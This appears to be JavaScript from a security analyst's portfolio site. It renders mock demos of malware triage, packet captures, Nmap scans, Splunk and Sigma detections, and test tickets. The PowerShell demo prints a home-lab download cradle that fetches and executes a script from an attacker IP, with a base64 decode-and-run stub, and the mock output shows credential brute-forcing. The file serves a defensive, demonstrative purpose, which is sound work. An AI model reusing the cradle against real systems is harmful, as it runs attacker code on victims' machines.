            hmi('MULTI-POINT<br><span class="big">3 PHONES</span><br>pairing Blackberry…');
          },
          end() {
            phone('#btb-p3', '#btb-s3', 'linked', 'CONNECTED');
            hmi('MULTI-POINT ACTIVE<br><span class="big">3 PHONES</span><br>audio arbitration OK');
          }
        },
        { // 6. security: rogue pairing attempt
          dur: 3200,
          run() {
            phone('#btb-p4', '#btb-s4', '', 'PAIRING ATTEMPT');
            if (l4) { l4.activate(); l4.packets(4, 'var(--neon-3)', 0.6).on(); }
            hmi('PAIRING REQUEST<br><span class="big">00:11:22:33:44:55</span><br>no PIN provided…', false);
            timers.later(() => {
              hmi('PAIRING REJECTED<br><span class="big">⛔ ACCESS DENIED</span><br>discoverable mode OFF', true);
              phone('#btb-p4', '#btb-s4', 'blocked', 'REJECTED ✓');
            }, 1600);
          },
          end() {
            if (l4) l4.off();
            hmi('SECURITY CHECK<br><span class="big">ROGUE BLOCKED ✓</span>', false);
          }
        },
        { // 7. stress cycles
          dur: 3600,
          run() {
            if (l1) { l1.off(); l1.packets(4, 'var(--neon-2)', 0.5).on(); }
            if (l2) { l2.off(); l2.packets(3, 'var(--neon-2)', 0.6).on(); }
            if (l3) { l3.off(); l3.packets(3, 'var(--neon-2)', 0.6).on(); }
            let c = 0;
            const cyc = timers.every(() => {
              c = Math.min(1000, c + 37);
              hmi(`STRESS TEST<br><span class="big">${c} / 1000</span><br>connect ↔ disconnect`);
              if (c >= 1000) clearInterval(cyc);
            }, 100);
            timers.later(() => clearInterval(cyc), 3600);
          },
          end() {
            hmi('STRESS DONE<br><span class="big">1000 CYCLES ✓</span><br>0 deadlocks · 0 lost pairs');
          }
        }
      ];
      const total = vsRunSteps($('#btb-steps', host), timers, phases);
      timers.later(() => playBench(), total + 4200); // loop the bench
    }
    playBench();

    ctx.tabs = [
      { id: 'sim',    label: '// Live Simulation' },
      { id: 'bug',    label: '// Bugzilla Report' },
      { id: 'carkit', label: '// Car-Kit Live Test' }
    ];
  };

  /* =================================================================
   *  6. CYBERGUARDIAN — Malware Triage Simulation
   * ================================================================= */
  SIMS['cyberguardian-scan'] = (host, ctx) => {
    host.innerHTML = `
      <div class="sim-h">CYBERGUARDIAN — LOCAL MALWARE TRIAGE</div>
      <div class="sim-p">Multi-layered detection tool: scans running processes, files, registry, network connections & memory; correlates with YARA rules + VirusTotal (70+ AV engines) + AI-based analysis (OpenAI / Gemini / DeepSeek) for malware classification with automatic MITRE ATT&CK technique mapping.</div>

      <div class="sim-section active" data-sim="scan">
        <div class="cg-grid">
          <div class="cg-tile" data-tile="process">
            <div class="cg-tile-head"><span>PROCESS ANALYSIS</span><span class="cg-status">●</span></div>
            <div class="cg-tile-body">Scanning PID 712 (svchost.exe)<br><span class="ioc">YARA match: malware_generic_loader</span><br>SHA256: 4f8c...e201<br><span class="ioc">VT: 38/72 detections</span><br>Behavior: parent=spoolsv.exe (suspicious chain)</div>
          </div>
          <div class="cg-tile" data-tile="file">
            <div class="cg-tile-head"><span>FILE ANALYSIS</span><span class="cg-status">●</span></div>
            <div class="cg-tile-body">C:\\Users\\victim\\Downloads\\invoice.xlsm<br><span class="ioc">YARA match: maldoc_vba_macro</span><br>Entropy: 7.8 (packed)<br>PE: N/A (Office doc)<br><span class="ioc">VT: 41/72 detections</span><br>Macros: ENABLED (suspicious)</div>
          </div>
          <div class="cg-tile" data-tile="registry">
            <div class="cg-tile-head"><span>REGISTRY ANALYSIS</span><span class="cg-status">●</span></div>
            <div class="cg-tile-body">HKCU\\Software\\Classes\\mscfile\\shell\\open\\command<br><span class="ioc">IFEO Debugger Injection detected!</span><br>Value: C:\\Windows\\Temp\\explorer.exe<br>Severity: CRITICAL persistence<br>Pattern: UAC bypass (eventvwr.exe)</div>
          </div>
          <div class="cg-tile" data-tile="network">
            <div class="cg-tile-head"><span>NETWORK ANALYSIS</span><span class="cg-status">●</span></div>
            <div class="cg-tile-body">Process: powershell.exe PID=4812<br>Remote: 192.168.56.103:443<br><span class="ioc">VT IP reputation: 12/92 malicious</span><br>Beaconing detected: 60s interval<br>C2 pattern: HTTP POST /check-in<br>ASN: AS-THREAT-ACTOR-2049</div>
          </div>
          <div class="cg-tile" data-tile="memory">
            <div class="cg-tile-head"><span>MEMORY FORENSICS</span><span class="cg-status">●</span></div>
            <div class="cg-tile-body">PID 712 (svchost.exe)<br>SeDebugPrivilege: ENABLED<br><span class="ioc">Injected code: 0x1a400000</span><br>YARA in memory: mimikatz_signature<br>Strings: "sekurlsa::logonpasswords"<br>IOC: lsass.dmp handle open</div>
          </div>
          <div class="cg-tile" data-tile="ai">
            <div class="cg-tile-head"><span>AI ANALYSIS — DEEPSEEK</span><span class="cg-status">●</span></div>
            <div class="cg-tile-body"><span class="ok">Verdict: MALICIOUS</span><br>Confidence: 94.7%<br>Risk score: 9.2/10<br>Threat type: Trojan + Credential Stealer<br>MITRE: T1059.001, T1003.001, T1053.005<br>Recommendation: isolate host, dump + analyze</div>
          </div>
        </div>
      </div>

      <div class="sim-section" data-sim="ai">
        <div class="sim-h">AI PROMPT + RESPONSE FLOW</div>
        <pre class="code-viewer"><span class="c">// ai_analysis/analyzer.py — analyze_detection()</span>

<span class="k">prompt</span> = <span class="s">"""
You are a senior malware analyst. Classify this detection:

DETECTION: IFEO Debugger Injection
RISK LEVEL: CRITICAL
FILE PATH: C:\\Windows\\Temp\\explorer.exe
REGISTRY KEY: HKCU\\Software\\Classes\\mscfile\\shell\\open\\command
YARA MATCHES: uac_bypass_eventvwr
VIRUSTOTAL: 41/72 detections
NETWORK: beacon to 192.168.56.103:443 every 60s

Map to MITRE ATT&CK. Recommend containment.
"""</span>

<span class="c"># Provider selection: DEEPSEEK (default) | OPENAI | GEMINI</span>
result = analyzer.analyze_detection(detection, <span class="k">provider</span>=AIProvider.DEEPSEEK)

<span class="c"># Returns AnalysisResult dataclass</span>
{
  <span class="s">"verdict"</span>:          <span class="s">"MALICIOUS"</span>,
  <span class="s">"confidence"</span>:       <span class="n">0.947</span>,
  <span class="s">"risk_score"</span>:      <span class="n">9.2</span>,
  <span class="s">"recommendations"</span>:  [<span class="s">"Isolate host"</span>, <span class="s">"Block C2 IP"</span>, <span class="s">"Run Volatility on RAM"</span>],
  <span class="s">"indicators"</span>:       [<span class="s">"192.168.56.103"</span>, <span class="s">"sha256:4f8c..."</span>],
  <span class="s">"mitre_techniques"</span>: [<span class="s">"T1548.002"</span>, <span class="s">"T1059.001"</span>, <span class="s">"T1003.001"</span>],
  <span class="s">"threat_type"</span>:      <span class="s">"Trojan.CredStealer"</span>
}</pre>
      </div>
    `;

    // animate tile scan states
    const tiles = $$('.cg-tile', host);
    tiles.forEach((t, i) => {
      t.classList.add('scanning');
      setTimeout(() => {
        t.classList.remove('scanning');
        const isThreat = !t.querySelector('[data-tile="ai"]');
        if (isThreat) t.classList.add('threat');
        else t.classList.add('clean');
      }, 800 + i * 600);
    });

    ctx.tabs = [
      { id: 'scan', label: '// Scan Output' },
      { id: 'ai',   label: '// AI Analysis' }
    ];
  };

  /* =================================================================
   *  7. HOME LAB — Attack Chain (same as soc-homelab but tabs differ)
   * ================================================================= */
  /* =================================================================
   *  8. SKILL SIMULATIONS — keyed by skill name
   *     Renders a contextual mini-sim calibrated to the skill level
   * ================================================================= */
  const SKILL_SIMS = {};

  // Python (Intermediate) — code editor + output
  SKILL_SIMS['Python'] = (host) => {
    host.innerHTML = `
      <div class="skill-modal-grid">
        <div class="skill-modal-block">
          <div class="skill-modal-head">
            <span class="skill-modal-name">process_scanner.py</span>
            <span class="skill-modal-lvl">INTERMEDIATE</span>
          </div>
          <pre class="code-viewer" style="max-height:300px"><span class="k">import</span> psutil, hashlib, yara

<span class="c"># Scan running processes, compute SHA256,</span>
<span class="c"># apply YARA rules, check VirusTotal.</span>

<span class="k">def</span> <span class="n">scan_processes</span>(yara_rules):
    findings = []
    <span class="k">for</span> proc <span class="k">in</span> psutil.process_iter([<span class="s">'pid'</span>, <span class="s">'name'</span>,
                                       <span class="s">'exe'</span>, <span class="s">'cmdline'</span>]):
        <span class="k">try</span>:
            sha = sha256_of(proc.info[<span class="s">'exe'</span>])
            matches = yara_rules.match(proc.info[<span class="s">'exe'</span>])
            <span class="k">if</span> matches:
                findings.append({
                    <span class="s">'pid'</span>: proc.info[<span class="s">'pid'</span>],
                    <span class="s">'name'</span>: proc.info[<span class="s">'name'</span>],
                    <span class="s">'sha256'</span>: sha,
                    <span class="s">'matches'</span>: [m.rule <span class="k">for</span> m <span class="k">in</span> matches]
                })
        <span class="k">except</span> (psutil.NoSuchProcess, psutil.AccessDenied):
            <span class="k">continue</span>
    <span class="k">return</span> findings

<span class="k">def</span> <span class="n">sha256_of</span>(path):
    h = hashlib.sha256()
    <span class="k">with</span> <span class="k">open</span>(path, <span class="s">'rb'</span>) <span class="k">as</span> f:
        <span class="k">for</span> chunk <span class="k">in</span> iter(<span class="k">lambda</span>: f.read(8192), b<span class="s">''</span>):
            h.update(chunk)
    <span class="k">return</span> h.hexdigest()</pre>
        </div>
        <div class="skill-modal-block">
          <div class="skill-modal-head">
            <span class="skill-modal-name">output</span>
            <span class="skill-modal-lvl" style="border-color:var(--neon-2);color:var(--neon-2)">DEMO RUN</span>
          </div>
          <div class="term" id="py-out"></div>
        </div>
      </div>
      <div class="sim-p" style="margin-top:14px">Demonstrates intermediate-level Python: OOP-style organization, exception handling (NoSuchProcess, AccessDenied), file binary I/O in chunks, hashlib + YARA integration. Same pattern as CyberGuardian's <span class="code-inline">scanners/process_scanner.py</span>.</div>
    `;
    attachTerminal($('#py-out', host), [
      '$ python3 process_scanner.py',
      '[*] Loading YARA rules from data/yara_rules/...',
      '[+] 12 rules loaded',
      '[*] Enumerating processes...',
      '[+] PID 412 (svchost.exe) sha=4f8c...e201 [clean]',
      '[!] PID 712 (svchost.exe) sha=ab12...9f3d matches: malware_loader',
      '[+] VirusTotal: 38/72 detections',
      '[!] PID 1288 (powershell.exe) cmdline contains IEX (DownloadString)',
      '[*] Scan complete: 2 suspicious processes found'
    ], { speed: 18, linePause: 200 });
  };

  // Wireshark (Advanced) — packet capture inspector
  SKILL_SIMS['Wireshark'] = (host) => {
    host.innerHTML = `
      <div class="sim-h">WIRESHARK — PACKET CAPTURE INSPECTION (Advanced)</div>
      <div class="sim-p">Deep packet inspection & multi-protocol decode. Mock of the disassembly view used at Sagemcom/LibertyGlobal to triage protocol-level anomalies on ISP gateway products.</div>
      <pre class="code-viewer" style="max-height:360px">
No.  Time       Source           Destination      Protocol  Length  Info
1    0.000000   192.168.1.10     192.168.1.1      DHCP      314     DHCP Discover - Transaction ID 0x4a92
2    0.001234   192.168.1.1      192.168.1.10     DHCP      328     DHCP Offer    - Server ID 192.168.1.1, Yiaddr 192.168.1.42
3    0.001812   192.168.1.10     192.168.1.1      DHCP      314     DHCP Request  - Requested IP 192.168.1.42
4    0.002019   192.168.1.1      192.168.1.10     DHCP      328     DHCP ACK      - Yiaddr 192.168.1.42

5    0.523411   192.168.1.42     8.8.8.8          DNS       78      Standard query 0x0001 A api.axa.fr
6    0.529812   8.8.8.8          192.168.1.42     DNS       110     Standard response 0x0001 A 93.184.216.34

7    1.234000   192.168.1.42     93.184.216.34    TLS       517     Client Hello (SNI=api.axa.fr)
8    1.287921   93.184.216.34    192.168.1.42     TLS       1452    Server Hello, Certificate, Server Hello Done
9    1.298012   192.168.1.42     93.184.216.34    TLS       134     Client Key Exchange, Change Cipher Spec, Finished

<span style="color:var(--neon-3)">>>> 10   2.512821   192.168.1.42     192.168.56.103   TLS       517     *** ANOMALY: TLS to internal attacker IP ***</span>
<span style="color:var(--neon-3)">>>> 11   2.572001   192.168.56.103  192.168.1.42     TLS       1452    *** C2 Beacon response — 60s interval ***</span>
<span style="color:var(--neon-4)">>>> 12   2.581234   192.168.1.42     239.255.255.250  SSDP     312     *** Suspicious multicast discovery ***</span>

13   3.123821   192.168.1.42     192.168.1.1      ARP       60      Who has 192.168.1.1? Tell 192.168.1.42
14   3.124012   192.168.1.1      192.168.1.42     ARP       60      192.168.1.1 is at 00:1a:2b:3c:4d:5e

15   4.001812   fe80::1         ff02::2          ICMPv6    70      Router Solicitation
16   4.005012   fe80::1         fe80::42         ICMPv6    86      Router Advertisement

[ Filter: tls or dns or dhcp  — 16 packets / 0.4s capture ]
[ Status: 2 critical anomalies flagged, 1 warning ]</pre>
    `;
  };

  // Splunk SPL (Intermediate)
  SKILL_SIMS['Splunk SPL'] = (host) => {
    host.innerHTML = `
      <div class="sim-h">SPLUNK SPL — Detection Queries (Intermediate)</div>
      <div class="sim-p">Hands-on usage from HTB CDSA exam, TryHackMe SOC Level 2 path, and home lab. Three real queries I authored for the privilege-escalation phase (UAC bypass via eventvwr.exe).</div>
      <pre class="code-viewer" style="max-height:340px"><span class="c">// Query 1 — Registry modification for UAC bypass (Sysmon Event ID 13)</span>
index=main sourcetype=<span class="s">"WinEventLog:Sysmon"</span> EventCode=<span class="n">13</span>
  TargetObject=<span class="s">"*mscfile*"</span>
| table _time, Message

<span class="c">// Query 2 — eventvwr.exe execution (Sysmon Event ID 1)</span>
index=main sourcetype=<span class="s">"WinEventLog:Sysmon"</span> EventCode=<span class="n">1</span>
  ParentImage=<span class="s">"*eventvwr.exe*"</span>
| table _time, Message

<span class="c">// Query 3 — Proof file was created (Security 4656 OR 4663)</span>
index=main sourcetype=<span class="s">"WinEventLog:Security"</span>
  (EventCode=<span class="n">4656</span> OR EventCode=<span class="n">4663</span>)
  ObjectName=<span class="s">"*msfile*"</span>
| table _time, Message</pre>
    `;
  };

  // Nmap (Advanced)
  SKILL_SIMS['Nmap'] = (host) => {
    host.innerHTML = `
      <div class="sim-h">NMAP — ADVANCED SCAN SUITE</div>
      <div class="sim-p">Used at Sagemcom + LibertyGlobal to fingerprint gateway attack surface and validate firewall behaviour. Below: scripted TCP SYN + service detection + vulnerability script scan against a typical XGS-PON gateway.</div>
      <div class="term" id="nmap-out"></div>
    `;
    attachTerminal($('#nmap-out', host), [
      '$ nmap -sS -sV --version-intensity 5 -O --traceroute -p1-65535 192.168.1.1',
      'Starting Nmap 7.94 ( https://nmap.org )',
      'Nmap scan report for 192.168.1.1',
      'Host is up (0.0042s latency).',
      'Not shown: 65530 closed tcp ports',
      'PORT     STATE SERVICE    VERSION',
      '22/tcp   open  ssh        OpenSSH 7.6 (protocol 2.0)  ← DEFAULT OPEN!',
      '23/tcp   open  telnet     BusyBox telnetd',
      '53/tcp   open  domain     dnsmasq 2.78',
      '80/tcp   open  http       lighttpd 1.4.59 (Web GUI)',
      '443/tcp  open  ssl/http   lighttpd 1.4.59',
      '5060/tcp open  sip        Kamailio 5.3 (VoIP)',
      '7547/tcp open  cwmp       TR-069 CWMP (FREMT) ←  CVE potential',
      '',
      'Device type: broadband gateway',
      'OS: Linux 4.9 (ARM)',
      'Network Distance: 1 hop',
      '',
      '$ nmap --script vuln,banner,fingerprint -p 22,80,443,7547 192.168.1.1',
      '|_http-vuln-cve2017-5638: Apache Struts RCE — N/A',
      '|_http-enum: /admin/ (potential admin panel)',
      '|_ssl-ccs-injection: No',
      '|_ssl-heartbleed: vulnerable  ← CRITICAL FINDING',
      '|_telnet-brute: login "admin/admin" — SUCCESS  ← CRITICAL FINDING',
      '',
      '$ nmap --script firewall-bypass,firewalk 192.168.1.1',
      '| firewalk: scanned 200 ports, 12 reachable through ACL',
      '|_firewall-bypass: 6 ports reachable via IPID spoofing'
    ], { speed: 14, linePause: 100 });
  };

  // tcpdump (Advanced)
  SKILL_SIMS['tcpdump'] = (host) => {
    host.innerHTML = `
      <div class="sim-h">TCPDUMP — LIVE CAPTURE</div>
      <div class="sim-p">Used at Sagemcom/LibertyGlobal to capture & analyse protocol-level traffic on CPE gateway interfaces. Below: live capture of a DHCP DORA sequence + DNS lookup + a suspicious beacon.</div>
      <div class="term" id="tcp-out"></div>
    `;
    attachTerminal($('#tcp-out', host), [
      '# tcpdump -i eth0 -nn -vv -X port 67 or port 68 or port 53 or port 443',
      'tcpdump: verbose output',
      '',
      '14:01:22.413921 IP 0.0.0.0.68 > 255.255.255.255.67: BOOTP/DHCP, Request, length 314',
      '    Client-Ethernet-Addr: 00:1a:2b:3c:4d:5e',
      '    Option (53) DHCP Discover',
      '14:01:22.421812 IP 192.168.1.1.67 > 192.168.1.42.68: BOOTP/DHCP, Reply, length 328',
      '    Option (53) DHCP Offer, Server-ID 192.168.1.1, Yiaddr 192.168.1.42',
      '14:01:22.423000 IP 0.0.0.0.68 > 192.168.1.1.67: BOOTP/DHCP, Request',
      '    Option (50) Requested-IP 192.168.1.42',
      '14:01:22.424018 IP 192.168.1.1.67 > 192.168.1.42.68: BOOTP/DHCP, ACK',
      '',
      '14:01:23.512000 IP 192.168.1.42.51114 > 8.8.8.8.53: 1234+ A? api.axa.fr.',
      '14:01:23.519000 IP 8.8.8.8.53 > 192.168.1.42.51114: 1234 1/0/0 A 93.184.216.34',
      '',
      '!!! 14:01:24.512000 IP 192.168.1.42.49213 > 192.168.56.103.443: Flags [P.], seq 1:468, ack 1, win 502',
      '!!! Suspicious: TLS handshake to attacker IP (192.168.56.103)',
      '!!! Pattern: every 60.0s — C2 beacon detected',
      '',
      '# filter: tcpdump -nn "tcp port 443 and host 192.168.56.103"',
      '# capture saved to /tmp/beacon.pcap for Splunk ingestion'
    ], { speed: 14, linePause: 110 });
  };

  // MITRE ATT&CK (Intermediate)
  SKILL_SIMS['MITRE ATT&CK'] = (host) => {
    host.innerHTML = `
      <div class="sim-h">MITRE ATT&CK — MAPPING WORKFLOW</div>
      <div class="sim-p">7-step methodology I use to map detections to MITRE ATT&CK (applied in HTB CDSA exam + home lab).</div>
      <ol style="padding:0;list-style:none;font-size:12px;color:var(--fg-soft);line-height:2">
        <li><span class="chain-no">01</span> Understand what the detection actually looks for</li>
        <li><span class="chain-no">02</span> Find the core attacker action</li>
        <li><span class="chain-no">03</span> Search MITRE ATT&CK (technique or sub-technique)</li>
        <li><span class="chain-no">04</span> Choose the best technique (T1548.002 for UAC bypass)</li>
        <li><span class="chain-no">05</span> Add the label to the detection rule (Sigma rule)</li>
        <li><span class="chain-no">06</span> Validate with another person or a test</li>
        <li><span class="chain-no">07</span> Keep it updated over time</li>
      </ol>
      <div class="sim-h" style="margin-top:14px">EXAMPLE — HOME LAB MAPPING</div>
      <pre class="code-viewer" style="max-height:200px"><span class="k">detection</span>: scheduled task with name SystemHealthMonitor
<span class="c"># Step 1: detection looks for schtasks /create with suspicious name</span>
<span class="c"># Step 2: core action = persistence via scheduled task</span>
<span class="c"># Step 3: search ATT&CK → T1053 (Scheduled Task/Job)</span>
<span class="c"># Step 4: sub-technique T1053.005 (Scheduled Task)</span>
<span class="c"># Step 5: add tag "attack.t1053.005" to Sigma rule</span>
<span class="c"># Step 6: validated by re-running the attack + detection</span>
<span class="c"># Step 7: review monthly for new sub-techniques</span></pre>
    `;
  };

  // PowerShell (Intermediate)
  SKILL_SIMS['PowerShell'] = (host) => {
    host.innerHTML = `
      <div class="sim-h">POWERSHELL — SCRIPTED ATTACK SIMULATION (Intermediate)</div>
      <div class="sim-p">From the home lab — Phase 2 PowerShell download cradle used to trigger detections.</div>
      <pre class="code-viewer" style="max-height:340px"><span class="c"># phase2_powershell_download_cradle.ps1</span>
<span class="c"># Auto_Open VBA macro spawns this hidden PowerShell.</span>

<span class="k">$ErrorActionPreference</span> = <span class="s">"SilentlyContinue"</span>

<span class="c"># Hidden window, execution policy bypassed</span>
<span class="k">Invoke-Expression</span> (<span class="k">New-Object</span> Net.WebClient).DownloadString(
  <span class="s">"http://192.168.56.103:8080/loader.ps1"</span>
)

<span class="c"># loader.ps1 content (compressed + base64 payload)</span>
<span class="k">$s</span> = <span class="k">New-Object</span> IO.Compression.GzipStream(
  (<span class="k">New-Object</span> IO.MemoryStream(,
    [Convert]::FromBase64String(<span class="s">"H4sIA..."</span>))),
  [IO.Compression.CompressionMode]::Decompress
)
<span class="k">$sr</span> = <span class="k">New-Object</span> IO.StreamReader(<span class="k">$s</span>)
<span class="k">Invoke-Expression</span> <span class="k">$sr</span>.ReadToEnd()

<span class="c"># Detection:</span>
<span class="c"># Sysmon Event ID 1 — Image=powershell.exe, CommandLine contains</span>
<span class="c"># "-ExecutionPolicy Bypass" AND "DownloadString"</span>
<span class="c"># Sigma rule: win_powershell_download_cradle.yml</span>
<span class="c"># MITRE: T1059.001</span></pre>
    `;
  };

  // Sigma Rule Authoring (Intermediate)
  SKILL_SIMS['Sigma Rule Authoring'] = (host) => {
    host.innerHTML = `
      <div class="sim-h">SIGMA — PERSISTENCE RULE (T1053.005)</div>
      <div class="sim-p">One of the Sigma rules I authored for the home lab — detects scheduled tasks created with suspicious names.</div>
      <pre class="code-viewer" style="max-height:380px"><span class="k">title</span>: <span class="s">Scheduled Task Creation for Persistence</span>
<span class="k">id</span>: <span class="s">4d5e6f7a-8b9c-0123-defa-234567890123</span>
<span class="k">status</span>: <span class="s">production</span>
<span class="k">description</span>: <span class="c"># Detects scheduled tasks that may be used for persistence. Monitors Security Event ID 4698 and Task Scheduler Event ID 106.</span>
<span class="k">references</span>:
  - <span class="s">https://attack.mitre.org/techniques/T1053/005/</span>
<span class="k">author</span>: <span class="s">SOC Home Lab Project Alpha</span>
<span class="k">date</span>: <span class="s">2024/09/12</span>
<span class="k">tags</span>:
  - <span class="s">attack.persistence</span>
  - <span class="s">attack.t1053.005</span>
<span class="k">logsource</span>:
  <span class="k">product</span>: <span class="s">windows</span>
  <span class="k">service</span>: <span class="s">security</span>
<span class="k">detection</span>:
  <span class="k">selection_4698</span>:
    <span class="k">EventID</span>: <span class="n">4698</span>
  <span class="k">selection_106</span>:
    <span class="k">EventID</span>: <span class="n">106</span>
    <span class="k">Source</span>: <span class="s">Microsoft-Windows-TaskScheduler</span>
  <span class="k">suspicious_names</span>:
    <span class="k">TaskName|contains</span>:
      - <span class="s">SystemHealth</span>
      - <span class="s">Updater</span>
      - <span class="s">Monitor</span>
      - <span class="s">Update</span>
      - <span class="s">WindowsUpdate</span>
  <span class="k">condition</span>: <span class="s">(selection_4698 or selection_106) and suspicious_names</span>
<span class="k">falsepositives</span>:
  - <span class="s">Legitimate software installation creating scheduled update tasks</span>
  - <span class="s">System administration scripts with similar naming patterns</span>
<span class="k">level</span>: <span class="s">medium</span></pre>
    `;
  };

  // Jira (Advanced) — bug ticket view
  SKILL_SIMS['Jira'] = (host) => {
    host.innerHTML = `
      <div class="sim-h">JIRA — BUG TICKET TEMPLATE (Advanced)</div>
      <div class="sim-p">The exact ticket structure I used at Sagemcom and LibertyGlobal for 800+ findings.</div>
      <pre class="code-viewer" style="max-height:380px"><span class="k">Ticket</span>: <span class="s">KDG-2018-0917</span>
<span class="k">Title</span>: <span class="s">Factory reset causes infinite boot loop on KDG DOCSIS 3.1</span>
<span class="k">Product</span>: <span class="s">KDG DOCSIS 3.1 broadband gateway</span>
<span class="k">Firmware</span>: <span class="s">v2.4.1-rc3 (pre-release)</span>
<span class="k">Severity</span>: <span class="n">CRITICAL</span>
<span class="k">CVSS</span>: <span class="n">8.0</span>
<span class="k">Reproducibility</span>: <span class="s">Always (100%)</span>
<span class="k">Category</span>: <span class="s">Functional / Availability</span>

<span class="k">Description</span>:
<span class="c">Performing a factory reset from the GUI or from SNMP management</span>
<span class="c">pushes the gateway into an infinite reboot loop, bricking the device.</span>

<span class="k">Steps to Reproduce</span>:
1. Login to GUI as admin
2. Navigate to Administration > Factory Reset
3. Click "Restore Defaults"
4. Wait for reboot
5. Observe: gateway enters infinite reboot cycle

<span class="k">Environment</span>:
- Hardware: KDG-DC3.1-Gateway
- Firmware: v2.4.1-rc3
- Test bench: Sagemcom Lab, isolated bench 4
- Tools used: GUI + SNMP management tool

<span class="k">Logs</span>:
- boot_cycle.log (full serial console capture)
- screenshots_5_attached.zip
- snmp_capture.pcap

<span class="k">Impact</span>:
<span class="c">Mass customer impact if shipped — hundreds/thousands of subscribers</span>
<span class="c">would brick their gateways. Manual recovery for each one.</span>

<span class="k">Remediation Proposal</span>:
<span class="c">1. During the boot loop, interrupt the boot process from the CLI</span>
<span class="c">2. Perform a manual firmware upgrade to the same version</span>
<span class="c">3. Only after upgrade does the gateway reboot and operate normally</span>

<span class="k">Traceability</span>:
- Requirement: REQ-KDG-2018-117
- Test cases: TC-KDG-2018-117-01 (GUI), TC-KDG-2018-117-02 (SNMP)
- ISO 27001:2022 Annex A control: A.8.9, A.8.10</pre>
    `;
  };

  // Docker (Intermediate)
  SKILL_SIMS['Docker'] = (host) => {
    host.innerHTML = `
      <div class="sim-h">DOCKER — LIBERTYGLOBAL TEST PLATFORM</div>
      <div class="sim-p">At LibertyGlobal, the test platform used Docker containers to simulate gateway clients (laptops, desktops, tablets, WiFi clients, management). Below: a typical XGS-PON test run using docker-compose.</div>
      <pre class="code-viewer" style="max-height:340px"><span class="c"># docker-compose.yml — XGS-PON test bench</span>
<span class="k">version</span>: <span class="s">'3.8'</span>
<span class="k">services</span>:

  <span class="k">lan-client-1</span>:
    image: <span class="s">libertyglobal/test-client:latest</span>
    network_mode: <span class="s">"bridge:lan-net"</span>
    environment:
      - ROLE=desktop
      - DHCP=true
    cap_add: [NET_ADMIN]

  <span class="k">lan-client-2</span>:
    image: <span class="s">libertyglobal/test-client:latest</span>
    network_mode: <span class="s">"bridge:lan-net"</span>
    environment:
      - ROLE=tablet

  <span class="k">wifi-client-2g</span>:
    image: <span class="s">libertyglobal/wifi-client:latest</span>
    environment:
      - BAND=2.4GHz
      - SSID=LG-Home

  <span class="k">voip-client</span>:
    image: <span class="s">libertyglobal/sip-client:kamailio-5.3</span>
    environment:
      - SIP_URI=sip:2001@lg-voice.local

  <span class="k">management</span>:
    image: <span class="s">libertyglobal/tr069-mgmt:latest</span>
    ports: [<span class="s">"7547:7547"</span>]

<span class="c"># Run:</span>
<span class="c"># $ docker-compose up -d</span>
<span class="c"># $ ./run-tests.sh --product xgs-pon --suite functional</span>
<span class="c"># $ ./run-tests.sh --product xgs-pon --suite security</span></pre>
    `;
  };

  // =========================================================================
  //  SKILL MODAL — 3-tab structure (Sources / Proficiency / Live Simulation)
  //  Every skill gets this structure regardless of whether a specific
  //  SKILL_SIMS[key] renderer exists. Specific renderers populate only the
  //  Live Simulation tab; generic skills get a level-calibrated live sim.
  // =========================================================================
  function levelDescriptor(lvl) {
    switch (lvl) {
      case 'beginner':     return 'Aware of the tool, can execute basic operations with documentation, still learning the workflow.';
      case 'intermediate': return 'Comfortable in production-like environments, can troubleshoot independently, contributes to team knowledge.';
      case 'advanced':     return 'Owns end-to-end workflows, trains others, makes architecture decisions, handles edge cases.';
      case 'expert':       return 'Recognised authority, sets standards, reviews others\' work, handles novel scenarios.';
      default:             return '—';
    }
  }

  function escapeHtmlS(s) {
    return String(s)
      .replace(/&/g, '&amp;').replace(/</g, '&lt;')
      .replace(/>/g, '&gt;').replace(/"/g, '&quot;');
  }

  // ---- Tab 1: SOURCES ----
  function renderSourcesSection(skill) {
    const cap = (skill.level || '').toUpperCase();
    const pct = skill.percent;
    return `
      <div class="skill-modal-grid">
        <div class="skill-modal-block">
          <div class="skill-modal-head">
            <span class="skill-modal-name">${escapeHtmlS(skill.name)}</span>
            <span class="skill-modal-lvl">${cap}</span>
          </div>
          <div class="sim-p">Proficiency self-assessed at <strong style="color:var(--neon)">${cap.charAt(0) + cap.slice(1).toLowerCase()}</strong> (${pct}%). Demonstrated via the following sources:</div>
          <ul class="skill-sources-list">
            ${skill.sources.map(s => `<li><span class="src-mark">▸</span> ${escapeHtmlS(s)}</li>`).join('')}
          </ul>
          <div class="sim-p" style="margin-top:14px;font-size:11px;color:var(--fg-dim);line-height:1.6">
            <strong style="color:var(--neon-2)">Level meaning:</strong><br>
            ${levelDescriptor((skill.level || '').toLowerCase())}
          </div>
        </div>
        <div class="skill-modal-block">
          <div class="skill-modal-head">
            <span class="skill-modal-name">where this skill was applied</span>
          </div>
          <div class="sim-p" style="font-size:12px;color:var(--fg-soft);line-height:1.7">
            Each source above corresponds to a concrete environment where the skill was exercised:
          </div>
          <ul class="source-context-list">
            ${skill.sources.map(src => {
              const ctx = sourceContext(src);
              return `<li><strong style="color:var(--neon-2)">${escapeHtmlS(src)}</strong><br><span style="color:var(--fg-dim);font-size:11px">${ctx}</span></li>`;
            }).join('')}
          </ul>
        </div>
      </div>
    `;
  }

  function sourceContext(src) {
    const map = {
      'Sagemcom':      'Protocol-level vulnerability testing on ISP broadband gateways (BBox3, Vodafone, KDG, TalkTalk, Telia, KPN) — 5 years, 800+ findings.',
      'LibertyGlobal': 'Senior vulnerability analysis on DOCSIS 3.0/3.1 Cable + XGS-PON Fibre products — 3 years, led team of 8 on XGS-PON.',
      'Capgemini':     'Mobile & web test automation for AXA Assurance France (iOS/Android) — Selenium, Appium, Azure DevOps, shift-left security.',
      'TryHackMe':     '400+ hands-on rooms completed, top 1% globally (rank ~2637). SOC Level 1 & 2 paths, Jr Penetration Tester path.',
      'HTB':           'HackTheBox defensive & offensive labs — SOC, forensics, and detection engineering hands-on practice.',
      'HTB CDSA':      'HackTheBox Certified Defensive Security Analyst exam — full attack-chain reconstruction, Splunk SPL, Sigma rules.',
      'Home Lab':      'Personal SOC + Pentest home lab (VirtualBox: DC, victim, web server, attacker Kali) — 9-phase attack chain with detections.',
      'Udemy':         'Self-authored 16-course cybersecurity curriculum on Udemy — 1,100+ students enrolled.'
    };
    return map[src] || 'Hands-on practice and applied exercises.';
  }

  // ---- Tab 2: PROFICIENCY RADAR ----
  function renderRadarSection(skill) {
    const lvl = (skill.level || '').toLowerCase();
    const pct = skill.percent;
    const cap = lvl.charAt(0).toUpperCase() + lvl.slice(1);
    const tiers = [
